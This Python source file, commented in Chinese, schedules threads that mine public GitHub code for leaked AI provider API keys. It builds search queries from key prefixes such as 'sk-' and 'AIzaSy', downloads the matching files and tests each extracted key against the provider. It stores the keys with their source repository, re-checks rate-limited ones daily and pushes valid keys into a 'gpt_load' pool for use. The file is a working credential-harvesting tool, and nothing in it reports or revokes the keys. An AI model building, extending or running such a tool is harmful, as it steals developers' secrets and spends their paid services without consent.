"""
任务调度器 - 多线程架构
1. 搜索线程：GitHub 搜索 API Keys
2. 校验线程：验证 Keys 有效性
3. 同步线程：自动同步有效 Keys
4. 重新校验线程：每天重新验证限流密钥
"""
import os
import queue
import threading
import time
from datetime import datetime, timedelta
from typing import Dict, List

from common.Logger import logger
from common.config import config
from utils.db_manager import db_manager
from utils.sync_utils import sync_utils
from app.providers.config_based_factory import ConfigBasedAIProviderFactory


class TaskScheduler:
    """三线程任务调度器"""

    def __init__(self):
        # 任务队列
        self.search_queue = queue.Queue(maxsize=1000)  # 搜索结果队列（待校验）
        self.validation_queue = queue.Queue(maxsize=1000)  # 校验结果队列（待同步）

        # 线程控制
        self.shutdown_flag = threading.Event()
        self.threads = []

    def start(self):
        """启动所有线程"""
        # 1. 搜索线程
        search_thread = threading.Thread(
            target=self._search_worker,
            name="SearchWorker",
            daemon=True
        )
        search_thread.start()
        self.threads.append(search_thread)

        # 2. 校验线程（多个工作线程）
        for i in range(3):  # 3个校验线程并发
            validation_thread = threading.Thread(
                target=self._validation_worker,
                name=f"ValidationWorker-{i}",
                daemon=True
            )
            validation_thread.start()
            self.threads.append(validation_thread)

        # 3. 同步线程
        sync_thread = threading.Thread(
            target=self._sync_worker,
            name="SyncWorker",
            daemon=True
        )
        sync_thread.start()
        self.threads.append(sync_thread)

        # 4. 限流密钥重新校验线程
        revalidation_thread = threading.Thread(
            target=self._revalidation_worker,
            name="RevalidationWorker",
            daemon=True
        )
        revalidation_thread.start()
        self.threads.append(revalidation_thread)

        # 5. 同步监控线程（每小时检查一次）
        sync_monitor_thread = threading.Thread(
            target=self._sync_monitor_worker,
            name="SyncMonitorWorker",
            daemon=True
        )
        sync_monitor_thread.start()
        self.threads.append(sync_monitor_thread)

        logger.info("✅ Task scheduler started with 4 worker types")

    def _search_worker(self):
        """搜索线程：执行 GitHub 搜索（响应式调度）"""
        from utils.github_client import GitHubClient
        from app.rate_limit_monitor import rate_limit_monitor
        import time

        github_client = GitHubClient(config.GITHUB_TOKENS)

        # 注册所有 tokens
        for token in config.GITHUB_TOKENS:
            rate_limit_monitor.register_token(token)

        # 首次启动立即执行
        first_run = True

        while not self.shutdown_flag.is_set():
            try:
                # 获取搜索查询
                search_queries = self._get_search_queries()

                if not search_queries:
                    logger.warning("⚠️ No search queries, sleeping...")
                    time.sleep(300)
                    continue

                # 去重关键字（仅限本次任务运行）
                original_count = len(search_queries)
                search_queries = list(dict.fromkeys(search_queries))  # 保持顺序的去重
                deduplicated_count = len(search_queries)

                if original_count != deduplicated_count:
                    logger.info(f"🔄 Deduplicated queries: {original_count} → {deduplicated_count} ({original_count - deduplicated_count} duplicates removed)")

                logger.info(f"🔍 Starting search with {len(search_queries)} unique queries")

                # 记录执行开始时间和统计
                start_time = time.time()
                total_search_requests = 0
                total_core_requests = 0
                files_processed = 0

                for i, query in enumerate(search_queries, 1):
                    if self.shutdown_flag.is_set():
                        break

                    try:
                        result = github_client.search_for_keys(query)

                        # 更新 rate limit monitor
                        if result and "rate_limit_info" in result and result["rate_limit_info"]:
                            rate_info = result["rate_limit_info"]
                            rate_limit_monitor.update_from_response(
                                token=rate_info['token'],
                                headers={
                                    'X-RateLimit-Remaining': rate_info['remaining'],
                                    'X-RateLimit-Limit': rate_info['limit'],
                                    'X-RateLimit-Reset': rate_info['reset'],
                                },
                                api_type='search'
                            )

                        # 统计请求数
                        if result and "stats" in result:
                            total_search_requests += result["stats"]["total_requests"]

                        if result and "items" in result:
                            for item in result["items"]:
                                # 放入校验队列
                                self.search_queue.put({
                                    'item': item,
                                    'query': query
                                })
                                files_processed += 1

                        # API 限流控制
                        if i % 5 == 0:
                            time.sleep(2)

                    except Exception as e:
                        logger.error(f"Search error for query '{query}': {e}")

                # 记录执行统计
                duration = time.time() - start_time
                rate_limit_monitor.record_search_execution(
                    queries_count=len(search_queries),
                    files_processed=files_processed,
                    search_requests=total_search_requests,
                    core_requests=total_core_requests,  # 校验线程会更新
                    duration_seconds=duration
                )

                # 检查是否启用动态调度
                use_dynamic = os.getenv("DYNAMIC_SCHEDULING", "true").lower() == "true"

                if use_dynamic:
                    # 🎯 智能调度：根据实际消耗计算下次间隔
                    sleep_seconds = rate_limit_monitor.calculate_next_interval()
                    next_run = datetime.now() + timedelta(seconds=sleep_seconds)
                    logger.info(f"💤 Search complete, next run at {next_run.strftime('%Y-%m-%d %H:%M:%S')} "
                               f"(dynamic scheduling, interval: {sleep_seconds/60:.1f} min)")
                else:
                    # 固定时间调度（支持简化配置）
                    schedule_config = os.getenv("SCHEDULE_CRON", "3")
                    next_run, sleep_seconds = self._parse_schedule_config(schedule_config)
                    logger.info(f"💤 Search complete, next run at {next_run.strftime('%Y-%m-%d %H:%M:%S')} "
                               f"(fixed schedule: {schedule_config})")

                # 分段休眠，以便能够响应 shutdown 信号
                while sleep_seconds > 0 and not self.shutdown_flag.is_set():
                    sleep_chunk = min(sleep_seconds, 60)
                    time.sleep(sleep_chunk)
                    sleep_seconds -= sleep_chunk

            except Exception as e:
                logger.error(f"Search worker error: {e}")
                time.sleep(60)

    def _validation_worker(self):
        """校验线程：验证 Keys"""
        from app.providers.config_key_extractor import ConfigKeyExtractor

        while not self.shutdown_flag.is_set():
            try:
                # 从搜索队列获取任务
                task = self.search_queue.get(timeout=30)

                item = task['item']
                file_sha = item.get("sha")
                file_url = item.get("html_url", "")
                file_path = item.get("path", "")
                repo_name = item["repository"]["full_name"]

                # 检查是否已扫描（基于SHA去重）
                if db_manager.is_file_scanned(file_sha):
                    continue

                # 下载文件内容
                from utils.github_client import GitHubClient
                github_client = GitHubClient(config.GITHUB_TOKENS)
                content = github_client.get_file_content(item)

                if not content:
                    continue

                # 提取并验证 Keys
                extracted = ConfigKeyExtractor.extract_all_keys(content)

                for provider_name, keys in extracted.items():
                    if not keys:
                        continue

                    provider = ConfigBasedAIProviderFactory.get_provider_by_name(provider_name)
                    if not provider:
                        continue

                    for key in keys:
                        validation_result = provider.validate_key(key)

                        if validation_result == "ok":
                            status = 'valid'
                            logger.info(f"✅ VALID {provider_name.upper()}: {key[:20]}...")
                        elif "rate_limited" in validation_result:
                            status = 'rate_limited'
                            logger.warning(f"⚠️ RATE LIMITED {provider_name.upper()}: {key[:20]}...")
                        else:
                            status = 'invalid'
                            logger.info(f"❌ INVALID {provider_name.upper()}: {key[:20]}...")

                        # 保存到数据库（不再存储 group_name，同步时实时获取）
                        key_id = db_manager.save_api_key(
                            api_key=key,
                            provider=provider_name,
                            status=status,
                            source_repo=repo_name,
                            source_file_path=file_path,
                            source_file_url=file_url,
                            source_file_sha=file_sha,
                            gpt_load_group_name=None,  # 不存储，同步时实时获取
                            metadata={'validation_result': validation_result}
                        )

                        # 有效的 Key 放入同步队列（存储 provider_name，同步时动态获取 group_name）
                        if status == 'valid' and key_id:
                            self.validation_queue.put({
                                'key_id': key_id,
                                'key': key,
                                'provider': provider_name  # 只存储 provider，不存储 group_name
                            })

                # 标记文件已扫描
                db_manager.mark_file_scanned(
                    file_sha=file_sha,
                    repo=repo_name,
                    file_path=file_path,
                    file_url=file_url
                )

                self.search_queue.task_done()

            except queue.Empty:
                continue
            except Exception as e:
                import traceback
                logger.error(f"Validation worker error: {e}")
                logger.error(traceback.format_exc())

    def _sync_worker(self):
        """同步线程：自动同步有效 Keys"""
        while not self.shutdown_flag.is_set():
            try:
                # 从校验队列获取任务
                task = self.validation_queue.get(timeout=30)

                key_id = task['key_id']
                key = task['key']
                provider_name = task['provider']

                # 实时获取 group_name（支持动态修改配置）
                from app.providers.config_key_extractor import ConfigKeyExtractor
                group_name = ConfigKeyExtractor.get_gpt_load_group_name(provider_name)

                # 检查是否配置了 group_name
                if not group_name or not group_name.strip():
                    logger.warning(f"⚠️ Skipping key {key_id}: provider '{provider_name}' has no gpt_load_group_name configured")
                    self.validation_queue.task_done()
                    continue

                # 执行同步
                logger.info(f"🔄 Syncing key {key_id} (provider: {provider_name}) to group '{group_name}'...")

                result = sync_utils._send_gpt_load_worker([key], group_name)

                if result == "success":
                    db_manager.mark_key_synced(key_id, 'gpt_load', success=True)
                    logger.info(f"✅ Synced key {key_id} to group '{group_name}'")
                else:
                    db_manager.mark_key_synced(key_id, 'gpt_load', success=False, error_message=result)
                    logger.error(f"❌ Failed to sync key {key_id}: {result}")

                self.validation_queue.task_done()

                # 同步限流
                time.sleep(1)

            except queue.Empty:
                # 队列为空时，检查数据库中的待同步 Keys
                self._sync_pending_keys()
                time.sleep(60)  # 每分钟检查一次
            except Exception as e:
                logger.error(f"Sync worker error: {e}")

    def _sync_pending_keys(self):
        """同步数据库中的待同步 Keys"""
        try:
            pending_keys = db_manager.get_pending_sync_keys('gpt_load', limit=10)

            if not pending_keys:
                return

            logger.info(f"🔄 Found {len(pending_keys)} pending keys in database")

            for key_obj in pending_keys:
                try:
                    # 实时获取 group_name（支持动态修改配置）
                    from app.providers.config_key_extractor import ConfigKeyExtractor
                    group_name = ConfigKeyExtractor.get_gpt_load_group_name(key_obj.provider)

                    # 检查是否配置了 group_name
                    if not group_name or not group_name.strip():
                        logger.warning(f"⚠️ Skipping key {key_obj.id}: provider '{key_obj.provider}' has no gpt_load_group_name configured")
                        continue

                    from utils.crypto import key_encryption
                    decrypted_key = key_encryption.decrypt_key(key_obj.key_encrypted)

                    logger.info(f"🔄 Syncing pending key {key_obj.id} (provider: {key_obj.provider}) to group '{group_name}'...")

                    result = sync_utils._send_gpt_load_worker([decrypted_key], group_name)

                    if result == "success":
                        db_manager.mark_key_synced(key_obj.id, 'gpt_load', success=True)
                        logger.info(f"✅ Synced pending key {key_obj.id} to group '{group_name}'")
                    else:
                        db_manager.mark_key_synced(key_obj.id, 'gpt_load', success=False, error_message=result)

                    time.sleep(1)

                except Exception as e:
                    logger.error(f"Failed to sync pending key {key_obj.id}: {e}")

        except Exception as e:
            logger.error(f"Failed to sync pending keys: {e}")

    def _parse_schedule_config(self, config: str) -> tuple:
        """
        解析调度配置，返回 (next_run_time, sleep_seconds)

        支持格式：
        - "3" : 每天凌晨3点
        - "3,9,15,21" : 每天多个时间点
        - "*/2" : 每2小时
        """
        now = datetime.now()

        # 简单小时格式: "3" 或 "3,9,15,21"
        if ',' in config:
            # 多个时间点
            hours = [int(h.strip()) for h in config.split(',')]
            hours.sort()

            # 找到下一个执行时间
            current_hour = now.hour
            next_hour = None

            for h in hours:
                if h > current_hour:
                    next_hour = h
                    break

            if next_hour is None:
                # 今天没有了，用明天的第一个
                next_hour = hours[0]
                next_run = (now + timedelta(days=1)).replace(hour=next_hour, minute=0, second=0, microsecond=0)
            else:
                next_run = now.replace(hour=next_hour, minute=0, second=0, microsecond=0)

        elif config.startswith('*/'):
            # 每N小时: "*/2"
            interval_hours = int(config[2:])
            next_run = now + timedelta(hours=interval_hours)
            next_run = next_run.replace(minute=0, second=0, microsecond=0)

        else:
            # 单个小时: "3"
            hour = int(config)
            next_run = now.replace(hour=hour, minute=0, second=0, microsecond=0)
            if next_run <= now:
                next_run += timedelta(days=1)

        sleep_seconds = (next_run - datetime.now()).total_seconds()
        return next_run, sleep_seconds

    def _get_search_queries(self):
        """获取搜索查询（自动生成，数据库模式，支持自定义关键字）"""
        auto_queries = []
        providers = config.AI_PROVIDERS_CONFIG

        # 简化的自动生成（只生成核心查询）
        languages = ['python', 'javascript', 'typescript', 'go']

        for provider in providers:
            patterns = provider.get('key_patterns', [])
            provider_name = provider.get('name', '').upper()
            custom_keywords = provider.get('custom_keywords', [])

            for pattern in patterns:
                import re
                if pattern.startswith('AIzaSy'):
                    prefix = 'AIzaSy'
                elif pattern.startswith('sk-'):
                    prefix = 'sk-'
                elif pattern.startswith('csk-'):
                    prefix = 'csk-'
                else:
                    match = re.match(r'^([A-Za-z0-9\-_]{3,10})', pattern)
                    if match:
                        prefix = match.group(1)
                    else:
                        continue

                # 核心查询（预设）
                for lang in languages:
                    auto_queries.append(f'"{provider_name}_API_KEY" = "{prefix}" language:{lang}')

                # 自定义关键字查询
                for custom_keyword in custom_keywords:
                    if custom_keyword and custom_keyword.strip():
                        for lang in languages:
                            auto_queries.append(f'"{custom_keyword}" "{prefix}" language:{lang}')

        return auto_queries

    def _revalidation_worker(self):
        """限流密钥重新校验线程：每天运行一次"""
        from app.rate_limit_revalidator import rate_limit_revalidator

        # 获取执行时间配置（默认每天凌晨 2 点）
        revalidation_hour = int(os.getenv("REVALIDATION_HOUR", "2"))

        logger.info(f"🔄 Rate-limit revalidation worker started, will run daily at {revalidation_hour}:00")

        while not self.shutdown_flag.is_set():
            try:
                # 计算下次执行时间
                now = datetime.now()
                next_run = now.replace(hour=revalidation_hour, minute=0, second=0, microsecond=0)

                # 如果今天的执行时间已过，推迟到明天
                if next_run <= now:
                    next_run += timedelta(days=1)

                # 等待到执行时间
                sleep_seconds = (next_run - datetime.now()).total_seconds()
                logger.info(f"💤 Next revalidation scheduled at {next_run.strftime('%Y-%m-%d %H:%M:%S')}")

                # 分段休眠，以便能够响应 shutdown 信号
                while sleep_seconds > 0 and not self.shutdown_flag.is_set():
                    sleep_chunk = min(sleep_seconds, 60)  # 每次最多睡 60 秒
                    time.sleep(sleep_chunk)
                    sleep_seconds -= sleep_chunk

                if self.shutdown_flag.is_set():
                    break

                # 执行重新校验
                logger.info("🚀 Starting scheduled rate-limited keys revalidation")
                rate_limit_revalidator.revalidate_rate_limited_keys(batch_size=50)
                logger.info("✅ Scheduled revalidation completed")

            except Exception as e:
                logger.error(f"❌ Revalidation worker error: {e}")
                import traceback
                logger.error(traceback.format_exc())
                # 出错后等待 1 小时再重试
                time.sleep(3600)

    def _sync_monitor_worker(self):
        """同步监控线程：每小时检查一次"""
        from app.sync_monitor import sync_monitor

        # 首次延迟15分钟启动
        time.sleep(900)

        while not self.shutdown_flag.is_set():
            try:
                logger.info("🔍 Running sync monitor check...")
                sync_monitor.check_and_notify()

                # 每小时检查一次
                if self.shutdown_flag.wait(timeout=3600):
                    break

            except Exception as e:
                logger.error(f"❌ Sync monitor worker error: {e}")
                time.sleep(3600)  # 发生错误后等待1小时再试

    def shutdown(self):
        """停止所有线程"""
        logger.info("🛑 Shutting down task scheduler...")
        self.shutdown_flag.set()

        for thread in self.threads:
            thread.join(timeout=5)

        logger.info("✅ Task scheduler stopped")


# 全局实例
task_scheduler = TaskScheduler()
